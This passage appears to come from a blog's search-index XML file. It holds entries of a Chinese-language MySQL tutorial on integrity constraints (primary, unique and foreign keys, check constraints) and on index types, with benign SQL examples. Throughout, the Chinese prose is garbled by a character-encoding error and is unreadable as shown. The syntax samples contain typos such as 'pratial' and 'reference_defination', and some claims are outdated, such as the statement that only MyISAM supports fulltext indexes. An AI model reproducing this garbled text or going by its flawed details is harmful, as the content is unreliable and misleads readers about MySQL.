<li>ç”¨å¤–é”®åˆ†è§£è¡¨ä¸­ä½é¢‘å­—æ®µã€‚æœ‰äº›å­—æ®µçš„ä½¿ç”¨é¢‘ç‡å¾ˆä½ï¼Œå½“è¡¨çš„æ•°æ®é‡å¾ˆå¤§æ—¶æŸ¥è¯¢é€Ÿåº¦ä¼šå¾ˆæ…¢ã€‚ç”¨å¤–é”®å°†è¿™äº›å­—æ®µæ‹†åˆ†æˆä¸€ä¸ªå•ç‹¬çš„è¡¨å¯ä»¥æé«˜æ•ˆç‡ã€‚</li>
<li>åœ¨ç›¸åŒç±»å‹çš„å­—æ®µé—´è¿›è¡Œæ¯”è¾ƒçš„æ“ä½œ</li>
</ul>
]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQLä¹‹å®Œæ•´æ€§çº¦æŸ</title>
    <url>/2018/05/30/mysql%E5%AE%9A%E4%B9%89%E5%AE%8C%E6%95%B4%E6%80%A7%E7%BA%A6%E6%9D%9F/</url>
    <content><![CDATA[<p>MySQLæä¾›äº†å¤šç§å®Œæ•´æ€§çº¦æŸï¼Œä½œä¸ºæ•°æ®åº“å…³ç³»æ¨¡å¼å®šä¹‰çš„ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥é€šè¿‡<code>create table</code>æˆ–<code>alter table</code>è¯­å¥æ¥å®šä¹‰ã€‚ä¸€æ—¦å®šä¹‰äº†å®Œæ•´æ€§çº¦æŸï¼ŒMySQLæœåŠ¡å™¨ä¼šéšæ—¶æ£€æµ‹å¤„äºæ›´æ–°çŠ¶æ€çš„æ•°æ®åº“å†…å®¹æ˜¯å¦ç¬¦åˆç›¸å…³çš„å®Œæ•´æ€§çº¦æŸï¼Œä»è€Œä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ä¸æ­£ç¡®æ€§ã€‚</p>
<p>åœ¨å…³ç³»æ¨¡å‹ä¸­ï¼Œæä¾›äº†å®ä½“å®Œæ•´æ€§ã€å‚ç…§å®Œæ•´æ€§å’Œç”¨æˆ·å®Œæ•´æ€§3é¡¹è§„åˆ™ã€‚</p>
<h2 id="å®ä½“å®Œæ•´æ€§"><a href="#å®ä½“å®Œæ•´æ€§" class="headerlink" title="å®ä½“å®Œæ•´æ€§"></a>å®ä½“å®Œæ•´æ€§</h2><p><code>å®ä½“</code>æ˜¯ä¸€ä¸ªæ•°æ®å¯¹è±¡ï¼Œæ˜¯æŒ‡å®¢è§‚å­˜åœ¨å¹¶å¯ä»¥ç›¸äº’åŒºåˆ†çš„äº‹ç‰©ï¼Œå¦‚ä¸€ä¸ªæ•™å¸ˆã€ä¸€ä¸ªå­¦ç”Ÿç­‰ã€‚ä¸€ä¸ªå®ä½“åœ¨æ•°æ®åº“ä¸­è¡¨ç°ä¸ºä¸€æ¡è®°å½•ã€‚</p>
<p>å®ä½“å®Œæ•´æ€§æ˜¯æŒ‡å…³ç³»çš„ä¸»å±æ€§åŠä¸»é”®çš„ç»„æˆä¸èƒ½ä¸ºç©ºã€‚ä¹Ÿå°±æ˜¯ä¸»é”®ä¸èƒ½ä½¿ç©ºå€¼nullã€‚å…³ç³»å¯¹åº”äºç°å®ä¸–ç•Œçš„å®ä½“é›†ï¼Œè€Œç°å®ä¸–ç•Œçš„å®ä½“æ˜¯å¯ä»¥åŒºåˆ†çš„ï¼Œå³è¯´æ˜æ¯ä¸ªå®ä¾‹å…·æœ‰å”¯ä¸€æ€§æ ‡è¯†ã€‚åœ¨å…³ç³»æ¨¡å‹ä¸­ï¼Œæ˜¯ä½¿ç”¨ä¸»é”®ä½œä¸ºå”¯ä¸€æ€§æ ‡è¯†çš„ã€‚</p>
<p>å…ˆæ¥è®¤è¯†ä¸€ä¸‹å…³ç³»å‹æ•°æ®åº“ä¸­é‡è¦çš„ä¸‰ä¸ªé”®ï¼š</p>
<ul>
<li>è¶…é”®(super key):åœ¨å…³ç³»ä¸­èƒ½å”¯ä¸€æ ‡è¯†å…ƒç»„çš„å±æ€§é›†ç§°ä¸ºå…³ç³»æ¨¡å¼çš„è¶…é”®</li>
<li>å€™é€‰é”®(candidate key):ä¸å«æœ‰å¤šä½™å±æ€§çš„è¶…é”®ç§°ä¸ºå€™é€‰é”® </li>
<li>ä¸»é”®(primary key):ç”¨æˆ·é€‰ä½œå…ƒç»„æ ‡è¯†çš„ä¸€ä¸ªå€™é€‰é”®ç¨‹åºä¸»é”®</li>
</ul>
<p>åœ¨MySQLä¸­ï¼Œå®ä½“å®Œæ•´æ€§æ˜¯é€šè¿‡<em>ä¸»é”®çº¦æŸ</em>å’Œ<em>å€™é€‰é”®çº¦æŸ</em>å®ç°çš„ã€‚</p>
<h3 id="ä¸»é”®çº¦æŸ"><a href="#ä¸»é”®çº¦æŸ" class="headerlink" title="ä¸»é”®çº¦æŸ"></a>ä¸»é”®çº¦æŸ</h3><p>ä¸»é”®å¯ä»¥æ˜¯è¡¨ä¸­çš„æŸä¸€åˆ—ï¼Œä¹Ÿå¯ä»¥æ˜¯è¡¨ä¸­å¤šä¸ªåˆ—æ‰€æ„æˆçš„ä¸€ä¸ªç»„åˆã€‚å…¶ä¸­å¤šä¸ªåˆ—ç»„åˆè€Œæˆçš„ä¸»é”®ä¹Ÿè¢«ç§°ä¸ºå¤åˆä¸»é”®ã€‚åœ¨MySQLä¸­ï¼Œä¸»é”®å¿…é¡»éµå¾ªå¦‚ä¸‹è§„åˆ™ï¼š</p>
<ol>
<li>æ¯ä¸ªè¡¨åªèƒ½å®šä¹‰ä¸€ä¸ªä¸»é”®</li>
<li>ä¸»é”®å¿…é¡»èƒ½å”¯ä¸€æ ‡è¯†è¡¨ä¸­çš„æ¯ä¸€è¡Œè®°å½•å¹¶ä¸”ä¸èƒ½ä¸ºnull</li>
<li>å¤åˆä¸»é”®ä¸èƒ½åŒ…å«ä¸å¿…è¦çš„å¤šä½™åˆ—</li>
<li>ä¸€ä¸ªåˆ—ååœ¨å¤åˆä¸»é”®çš„åˆ—è¡¨ä¸­åªèƒ½å‡ºç°ä¸€æ¬¡</li>
</ol>
<p>ä½œä¸ºåˆ—çš„ä¸»é”®çº¦æŸï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>ä½œä¸ºè¡¨çš„ä¸»é”®çº¦æŸï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age tinyint,</span><br><span class="line">    <span class="keyword">primary</span> key (id,name)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>å¦‚æœä¸»é”®ä»…ç”±è¡¨ä¸­çš„æŸä¸€åˆ—æ„æˆï¼Œä»¥ä¸Šä¸¤ç§æ–¹æ³•å‡å¯ä»¥å®šä¹‰ä¸»é”®ã€‚å¦‚æœä¸»é”®ç”±è¡¨ä¸­å¤šä¸ªåˆ—ç»„æˆï¼Œé‚£ä¹ˆåªèƒ½æœ‰ç¬¬äºŒç§æ–¹æ³•å®šä¹‰ä¸»é”®çº¦æŸã€‚</strong></p>
<h3 id="å€™é€‰é”®çº¦æŸ"><a href="#å€™é€‰é”®çº¦æŸ" class="headerlink" title="å€™é€‰é”®çº¦æŸ"></a>å€™é€‰é”®çº¦æŸ</h3><p>å¦‚æœä¸€ä¸ªå±æ€§é›†èƒ½<strong>å”¯ä¸€æ ‡è¯†å…ƒç»„</strong>è€Œåˆ<strong>ä¸å«æœ‰å¤šä½™çš„å±æ€§</strong>ï¼Œé‚£ä¹ˆè¿™ä¸ªå±æ€§é›†ç§°ä¸ºå…³ç³»çš„å€™é€‰é”®ï¼Œç”¨å…³é”®å­—<code>unique</code>æ¥å®šä¹‰ã€‚</p>
<p>å€™é€‰é”®å¯ä»¥æ˜¯è¡¨ä¸­çš„æŸä¸€åˆ—ï¼Œä¹Ÿå¯ä»¥æ˜¯è¡¨ä¸­å¤šä¸ªåˆ—æ‰€æ„æˆçš„ä¸€ä¸ªç»„åˆã€‚<strong>ä»»ä½•æ—¶å€™ï¼Œå€™é€‰é”®çš„å€¼å¿…é¡»æ˜¯å”¯ä¸€çš„ä¸”ä¸èƒ½ä¸ºç©º</strong>ã€‚å®šä¹‰æ–¹æ³•ç±»ä¼¼äºä¸»é”®ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">unique</span>,</span><br><span class="line">    age tinyint</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age tinyint,</span><br><span class="line">    <span class="keyword">unique</span> (name,age)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>å€™é€‰é”®ä¸ä¸»é”®çš„åŒºåˆ«åœ¨äºï¼š</p>
<ol>
<li>ä¸€ä¸ªè¡¨åªèƒ½åˆ›å»ºä¸€ä¸ªä¸»é”®ï¼Œä½†æ˜¯å¯ä»¥æœ‰å¤šä¸ªå€™é€‰é”®</li>
<li>å®šä¹‰ä¸»é”®çº¦æŸæ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»º<code>primary key</code>ç´¢å¼•ï¼Œå®šä¹‰å€™é€‰é”®çº¦æŸæ—¶ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åˆ›å»º<code>unique</code>ç´¢å¼•</li>
</ol>
<h2 id="å‚ç…§å®Œæ•´æ€§"><a href="#å‚ç…§å®Œæ•´æ€§" class="headerlink" title="å‚ç…§å®Œæ•´æ€§"></a>å‚ç…§å®Œæ•´æ€§</h2><p>ç°å®ä¸–ç•Œçš„å®ä½“ä¹‹é—´å¾€å¾€å­˜åœ¨ç€æŸç§è”ç³»ï¼Œåœ¨å…³ç³»æ¨¡å‹ä¸­ï¼Œå®ä½“åŠå®ä½“é—´çš„è”ç³»éƒ½æ˜¯ç”¨å…³ç³»æ¥æè¿°çš„ï¼Œé‚£ä¹ˆè‡ªç„¶å°±å­˜åœ¨å…³ç³»ä¸å…³ç³»é—´çš„å¼•ç”¨ã€‚</p>
<p><strong>å‚ç…§å®Œæ•´æ€§å°±æ˜¯å®šä¹‰å¤–é”®ä¸ä¸»é”®ä¹‹é—´çš„å¼•ç”¨å…³ç³»</strong>çš„ã€‚å‚ç…§å®Œæ•´æ€§çš„å®šä¹‰ä¸ºï¼š</p>
<blockquote>
<p>è‹¥å±æ€§ï¼ˆæˆ–å±æ€§ç»„ï¼‰Fæ˜¯åŸºæœ¬å…³ç³»Rçš„å¤–é”®ï¼Œå®ƒä¸åŸºæœ¬å…³ç³»Sçš„ä¸»é”®Kå¯¹åº”ï¼Œåˆ™å¯¹äºRä¸­çš„æ¯ä¸ªå…ƒç»„åœ¨Fä¸Šçš„å€¼åªå…è®¸ä¸¤ç§å¯èƒ½ï¼šè¦ä¹ˆå–ç©ºå€¼ï¼Œè¦ä¹ˆç­‰äºSä¸­æŸä¸ªå…ƒç»„çš„ä¸»é”®å€¼ï¼Œå…¶ä¸­Rä¸Så¯ä»¥æ˜¯ä¸åŒçš„å…³ç³»ï¼Œä¹Ÿå¯ä»¥æ˜¯åŒä¸€æ˜¯å…³ç³»ï¼Œè€ŒFå’ŒKå®šä¹‰åœ¨åŒä¸€ä¸ªåŸŸä¸­ã€‚</p>
</blockquote>
<p>å£°æ˜å¤–é”®çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[<span class="keyword">constraint</span> [symbol]] <span class="keyword">foreign</span> key (index_col_name,...) reference_defination</span><br></pre></td></tr></table></figure>

<p><code>reference_defination</code>ä¸»è¦ç”¨äºå®šä¹‰å¤–é”®æ‰€å‚ç…§çš„è¡¨ã€åˆ—ï¼Œå®ƒçš„åŸºæœ¬è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">references</span> tbl_name [(index_col_name,...)]</span><br><span class="line">[<span class="keyword">match</span> <span class="keyword">full</span> <span class="operator">|</span> <span class="keyword">match</span> pratial <span class="operator">|</span> <span class="keyword">match</span> simple]</span><br><span class="line">[<span class="keyword">on</span> <span class="keyword">delete</span> reference_options]</span><br><span class="line">[<span class="keyword">on</span> update reference_options]</span><br></pre></td></tr></table></figure>

<p><code>tbl_name</code>æŒ‡å®šå¤–é”®æ‰€å‚ç…§çš„è¡¨åï¼Œè¿™ä¸ªè¡¨ç§°ä¸º<code>è¢«å‚ç…§è¡¨</code>æˆ–<code>çˆ¶è¡¨</code>ï¼Œå¤–é”®æ‰€åœ¨çš„è¡¨è¢«ç§°ä¸º<code>å‚ç…§è¡¨</code>æˆ–<code>å­è¡¨</code>ã€‚</p>
<p><code>index_col_name</code>æŒ‡å®šè¢«å‚ç…§è¡¨ä¸­ä¸å¤–é”®ç›¸å…³è”çš„åˆ—ï¼Œ<strong>å¿…é¡»æ˜¯çˆ¶è¡¨çš„ä¸»é”®æˆ–å€™é€‰é”®</strong>ï¼Œæ ¼å¼è¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">col_name [(length)] [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>]</span><br></pre></td></tr></table></figure>

<p><code>reference_options</code>æŒ‡å®šå‚ç…§å®Œæ•´æ€§çº¦æŸçš„å®ç°ç­–ç•¥ï¼Œé»˜è®¤ä¸º<code>restrict</code>ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">restrict <span class="operator">|</span> cascade <span class="operator">|</span> <span class="keyword">set</span> <span class="keyword">null</span> <span class="operator">|</span> <span class="keyword">no</span> action</span><br></pre></td></tr></table></figure>

<ul>
<li>restrict é™åˆ¶ç­–ç•¥ï¼šå½“è¦åˆ é™¤æˆ–æ›´æ–°è¢«å‚ç…§è¡¨ä¸­è¢«å‚ç…§åˆ—ä¸Šï¼Œå¹¶åœ¨å¤–é”®ä¸­å‡ºç°çš„å€¼æ—¶ï¼Œç³»ç»Ÿæ‹’ç»å¯¹è¢«å‚ç…§è¡¨çš„åˆ é™¤å’Œæ›´æ–°</li>
<li>no action ä¸é‡‡å–æªæ–½ç­–ç•¥ï¼šä¸€ä¸ªç›¸å…³çš„å¤–é”®å€¼åœ¨è¢«å‚ç…§è¡¨ä¸­æ—¶ï¼Œåˆ é™¤æˆ–æ›´æ–°è¢«å‚ç…§è¡¨ä¸­çš„é”®å€¼åŠ¨ä½œä¸è¢«å…è®¸ã€‚ç±»ä¼¼äºrestrict</li>
<li>cascade çº§è”ç­–ç•¥ï¼šä»è¢«å‚ç…§è¡¨ä¸­åˆ é™¤æˆ–æ›´æ–°çºªå½•è¡Œæ—¶ï¼Œè‡ªåŠ¨åˆ é™¤æˆ–æ›´æ–°å‚ç…§è¡¨åŒ¹é…çš„è®°å½•è¡Œ</li>
<li>set null åˆ¶ç©ºç­–ç•¥ï¼šä»è¢«å‚ç…§è¡¨ä¸­åˆ é™¤æˆ–æ›´æ–°çºªå½•è¡Œæ—¶ï¼Œè®¾ç½®å‚ç…§è¡¨ä¸­ä¸ä¹‹å¯¹åº”çš„å¤–é”®åˆ—çš„å€¼ä¸ºnullã€‚è¿™ä¸ªç­–ç•¥éœ€è¦è¢«å‚ç…§è¡¨ä¸­çš„å¤–é”®æ²¡æœ‰å£°æ˜é™å®šè¯not null</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    class_id tinyint <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    <span class="keyword">constraint</span> class <span class="keyword">foreign</span> key (class_id) <span class="keyword">references</span> class(id)</span><br><span class="line">    <span class="keyword">on</span> <span class="keyword">delete</span> cascade</span><br><span class="line">    <span class="keyword">on</span> update cascade</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>**å½“çˆ¶å­è¡¨æ˜¯åŒä¸€å¼ è¡¨æ—¶ï¼ŒMySQLä¸å…è®¸æŒ‡å®š<code>on update cascade</code>ä¸<code>on update set null</code>**ï¼Œç›¸å…³è”çš„ä¸¤ä¸ªå­—æ®µç±»å‹å¿…é¡»ä¸€è‡´ã€‚</p>
<h2 id="ç”¨æˆ·å®šä¹‰å®Œæ•´æ€§"><a href="#ç”¨æˆ·å®šä¹‰å®Œæ•´æ€§" class="headerlink" title="ç”¨æˆ·å®šä¹‰å®Œæ•´æ€§"></a>ç”¨æˆ·å®šä¹‰å®Œæ•´æ€§</h2><p>ç”¨æˆ·å®šä¹‰å®Œæ•´æ€§æ˜¯é’ˆå¯¹æŸä¸€åº”ç”¨ç¯å¢ƒçš„å®Œæ•´æ€§çº¦æŸæ¡ä»¶ï¼Œå®ƒåæ˜ äº†æŸä¸€å…·ä½“åº”ç”¨æ‰€æ¶‰åŠçš„æ•°æ®åº”æ»¡è¶³çš„è¦æ±‚ï¼Œå…³ç³»æ¨¡å‹æä¾›å®šä¹‰å’Œæ£€æŸ¥è¿™ç±»å®Œæ•´æ€§è§„åˆ™çš„æœºåˆ¶ã€‚</p>
<p>MySQLæä¾›äº†<strong>éç©ºçº¦æŸ</strong>ï¼Œ<strong>checkçº¦æŸ</strong>å’Œ<strong>è§¦å‘å™¨</strong>3ç§ç”¨æˆ·è‡ªå®šä¹‰å®Œæ•´æ€§çº¦æŸã€‚</p>
<p>é€šè¿‡<code>create table</code>æˆ–<code>alter table</code>è¯­å¥å°†æŸä¸ªåˆ—åŠ ä¸Šå…³é”®å­—<code>not null</code>å¯ä»¥å®ç°éç©ºçº¦æŸã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users modify age tinyint <span class="keyword">not</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å¯¹åˆ—æˆ–è¡¨ä½¿ç”¨<code>check</code>çº¦æŸï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">check</span> (expr)</span><br></pre></td></tr></table></figure>

<p><code>expr</code>æ˜¯ä¸€ä¸ªSQLè¡¨è¾¾å¼ï¼Œç”¨äºæŒ‡å®šéœ€è¦æ£€æŸ¥çš„é™å®šæ¡ä»¶ã€‚æ›´æ–°æ•°æ®æ—¶MySQLä¼šæ£€æŸ¥æ›´æ–°åçš„æ•°æ®è¡Œæ˜¯å¦æ»¡è¶³<code>check</code>çº¦æŸä¸­çš„é™å®šæ¡ä»¶ã€‚è¯¥æ¡ä»¶å¯ä»¥æ˜¯è¡¨è¾¾å¼ï¼Œä¹Ÿå¯ä»¥æ˜¯å­æŸ¥è¯¢ã€‚</p>
<p>å¯¹åˆ—ä½¿ç”¨checkçº¦æŸï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users (</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age tinyint <span class="keyword">check</span>(age<span class="operator">&gt;</span><span class="number">6</span> <span class="keyword">and</span> age<span class="operator">&lt;</span><span class="number">19</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>å¯¹è¡¨ä½¿ç”¨checkçº¦æŸï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> users(</span><br><span class="line">    id tinyint auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age tinyint,</span><br><span class="line">    <span class="keyword">check</span>(name <span class="keyword">in</span> (<span class="keyword">select</span> name <span class="keyword">from</span> students))</span><br><span class="line">);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>æ•°æ®åº“</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQLä¹‹ç´¢å¼•ä¸èŒƒå¼</title>
    <url>/2018/05/30/%E3%80%8AMySQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B%E4%B9%8B%E7%B4%A2%E5%BC%95%E4%B8%8E%E8%A7%86%E5%9B%BE/</url>
    <content><![CDATA[<p>ç´¢å¼•æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ•°æ®ç»“æ„ï¼Œç±»ä¼¼äºå­—å…¸é‡Œçš„ keyã€‚é€šè¿‡ç´¢å¼•æŸ¥è¯¢æ•°æ®åº“ä¸­çš„å†…å®¹æ—¶ï¼Œä¸éœ€è¦éå†æ‰€æœ‰æ•°æ®è€Œæ˜¯ç›´æ¥æŒ‡å‘æ•°æ®æ‰€åœ¨çš„ä½ç½®ï¼Œè¿™æ ·å°±å¯ä»¥å¿«é€ŸæŸ¥è¯¢åˆ°æƒ³è¦çš„å†…å®¹ã€‚</p>
<p>ç´¢å¼•æ˜¯æŠŠåŒåˆƒå‰‘ï¼Œè™½ç„¶ç´¢å¼•å¯ä»¥æé«˜æ£€ç´¢æ•°æ®çš„é€Ÿåº¦ï¼Œæé«˜æ•´ä½“çš„æ€§èƒ½ï¼Œä½†æ˜¯ä¹Ÿä¼šå¸¦æ¥ä¸€äº›å‰¯ä½œç”¨ï¼š  </p>
<ol>
<li>é¢å¤–çš„ç‰©ç†ç©ºé—´ï¼ˆå•åˆ—ç´¢å¼•è‡³å°‘å åŸè¡¨5%åˆ°15%ï¼‰</li>
<li>é¢å¤–çš„åˆ›å»ºå’Œç»´æŠ¤æ—¶é—´ï¼ˆcreateã€insertã€updateã€deleteç­‰ï¼‰</li>
</ol>
<p>MySQL æ”¯æŒå¾ˆå¤šæ•°æ®ç±»å‹ï¼Œé€‰æ‹©åˆé€‚çš„æ•°æ®ç±»å‹å­˜å‚¨æ•°æ®å¯¹æ€§èƒ½æœ‰å¾ˆå¤§çš„å½±å“ã€‚é€šå¸¸æ¥è¯´ï¼Œå¯ä»¥éµå¾ªä»¥ä¸‹ä¸€äº›æŒ‡å¯¼åŸåˆ™ï¼š</p>
<ol>
<li>è¶Šå°çš„æ•°æ®ç±»å‹é€šå¸¸æ›´å¥½ï¼šè¶Šå°çš„æ•°æ®ç±»å‹é€šå¸¸åœ¨ç£ç›˜ã€å†…å­˜å’ŒCPUç¼“å­˜ä¸­éƒ½éœ€è¦æ›´å°‘çš„ç©ºé—´ï¼Œå¤„ç†èµ·æ¥æ›´å¿«ã€‚</li>
<li>ç®€å•çš„æ•°æ®ç±»å‹æ›´å¥½ï¼šæ•´å‹æ•°æ®æ¯”èµ·å­—ç¬¦ï¼Œå¤„ç†å¼€é”€æ›´å°ï¼Œå› ä¸ºå­—ç¬¦ä¸²çš„æ¯”è¾ƒæ›´å¤æ‚ã€‚åœ¨MySQLä¸­ï¼Œåº”è¯¥ç”¨å†…ç½®çš„æ—¥æœŸå’Œæ—¶é—´æ•°æ®ç±»å‹ï¼Œè€Œä¸æ˜¯ç”¨å­—ç¬¦ä¸²æ¥å­˜å‚¨æ—¶é—´ï¼›ä»¥åŠç”¨æ•´å‹æ•°æ®ç±»å‹å­˜å‚¨IPåœ°å€ã€‚</li>
<li>å°½é‡é¿å…NULLï¼šåº”è¯¥æŒ‡å®šåˆ—ä¸ºNOT NULLï¼Œé™¤éä½ æƒ³å­˜å‚¨NULLã€‚åœ¨MySQLä¸­ï¼Œå«æœ‰ç©ºå€¼çš„åˆ—å¾ˆéš¾è¿›è¡ŒæŸ¥è¯¢ä¼˜åŒ–ï¼Œå› ä¸ºå®ƒä»¬ä½¿å¾—ç´¢å¼•ã€ç´¢å¼•çš„ç»Ÿè®¡ä¿¡æ¯ä»¥åŠæ¯”è¾ƒè¿ç®—æ›´åŠ å¤æ‚ã€‚ä½ åº”è¯¥ç”¨0ã€ä¸€ä¸ªç‰¹æ®Šçš„å€¼æˆ–è€…ä¸€ä¸ªç©ºä¸²ä»£æ›¿ç©ºå€¼ã€‚</li>
</ol>
<h2 id="ç´¢å¼•åˆ†ç±»"><a href="#ç´¢å¼•åˆ†ç±»" class="headerlink" title="ç´¢å¼•åˆ†ç±»"></a>ç´¢å¼•åˆ†ç±»</h2><p>å¸¸è§çš„ç´¢å¼•åŒ…æ‹¬æ™®é€šç´¢å¼•ã€å”¯ä¸€æ€§ç´¢å¼•ã€å…¨æ–‡ç´¢å¼•ã€å•åˆ—ç´¢å¼•ã€å¤šåˆ—ç´¢å¼•ç­‰</p>
<ol>
<li>æ™®é€šç´¢å¼•ï¼šå³ä¸åº”ç”¨ä»»ä½•é™åˆ¶æ¡ä»¶çš„ç´¢å¼•ï¼Œè¯¥ç´¢å¼•å¯ä»¥åœ¨ä»»ä½•æ•°æ®ç±»å‹ä¸­åˆ›å»ºã€‚å­—æ®µæœ¬èº«çš„çº¦æŸæ¡ä»¶å¯ä»¥åˆ¤æ–­å…¶å€¼æ˜¯å¦ä¸ºç©ºæˆ–å”¯ä¸€ã€‚</li>
<li>å”¯ä¸€æ€§ç´¢å¼•ï¼šä½¿ç”¨ <code>unique</code> å‚æ•°å¯ä»¥è®¾ç½®å”¯ä¸€ç´¢å¼•ã€‚åˆ›å»ºè¯¥ç´¢å¼•æ—¶ç´¢å¼•çš„å€¼å¿…é¡»å”¯ä¸€ã€‚é€šè¿‡å”¯ä¸€ç´¢å¼•ï¼Œç”¨æˆ·å¯ä»¥å¿«é€Ÿå®šä½æŸæ¡æ•°æ®ã€‚<strong>ä¸»é”®æ˜¯ä¸€ç§ç‰¹æ®Šçš„å”¯ä¸€ç´¢å¼•</strong>ã€‚</li>
<li>å…¨æ–‡ç´¢å¼•ï¼š<code>fulltext</code> å‚æ•°å¯ä»¥è®¾ç½®ç´¢å¼•ä¸ºå…¨æ–‡ç´¢å¼•ã€‚å…¨æ–‡ç´¢å¼•åªèƒ½åˆ›å»ºåœ¨ <code>char</code>ã€<code>varchar</code>ã€<code>text</code> ç±»å‹å­—æ®µä¸Šã€‚æŸ¥è¯¢æ•°æ®é‡è¾ƒå¤§çš„å­—ç¬¦ä¸²å‹å­—æ®µæ—¶ï¼Œä½¿ç”¨å…¨æ–‡ç´¢å¼•å¯ä»¥æé«˜æŸ¥è¯¢é€Ÿåº¦ã€‚<strong>åªæœ‰ MyISAM æ”¯æŒ <code>fulltext</code> ç´¢å¼•</strong></li>
<li>å•åˆ—ç´¢å¼•ï¼šå°±æ˜¯åªå¯¹åº”ä¸€ä¸ªå­—æ®µçš„ç´¢å¼•ï¼Œå¯ä»¥åŒ…æ‹¬ä»¥ä¸Šä¸‰ç§ç´¢å¼•æ–¹å¼ã€‚</li>
<li>å¤šåˆ—ç´¢å¼•ï¼šåœ¨è¡¨çš„å¤šä¸ªå­—æ®µä¸Šåˆ›å»ºä¸€ä¸ªç´¢å¼•ã€‚è¯¥ç´¢å¼•æŒ‡å‘åˆ›å»ºæ—¶å¯¹åº”çš„å¤šä¸ªå­—æ®µã€‚å¯ç”¨é€šè¿‡è¿™å‡ ä¸ªå­—æ®µè¿›è¡ŒæŸ¥è¯¢ä½†æ˜¯<strong>è¿™å‡ ä¸ªå­—æ®µå¿…é¡»åŒ…å«å¤šåˆ—ç´¢å¼•çš„ç¬¬ä¸€ä¸ªå­—æ®µï¼Œåªæœ‰è¿™æ ·å¤šåˆ—ç´¢å¼•æ‰ä¼šå‘æŒ¥ä½œç”¨</strong></li>
</ol>
<h2 id="åˆ›å»ºç´¢å¼•"><a href="#åˆ›å»ºç´¢å¼•" class="headerlink" title="åˆ›å»ºç´¢å¼•"></a>åˆ›å»ºç´¢å¼•</h2><h3 id="åœ¨å»ºç«‹æ•°æ®è¡¨æ—¶åˆ›å»ºç´¢å¼•"><a href="#åœ¨å»ºç«‹æ•°æ®è¡¨æ—¶åˆ›å»ºç´¢å¼•" class="headerlink" title="åœ¨å»ºç«‹æ•°æ®è¡¨æ—¶åˆ›å»ºç´¢å¼•"></a>åœ¨å»ºç«‹æ•°æ®è¡¨æ—¶åˆ›å»ºç´¢å¼•</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> table_name (</span><br><span class="line">    create_defination</span><br><span class="line">    [<span class="keyword">unique</span> <span class="operator">|</span> fulltext] index</span><br><span class="line">    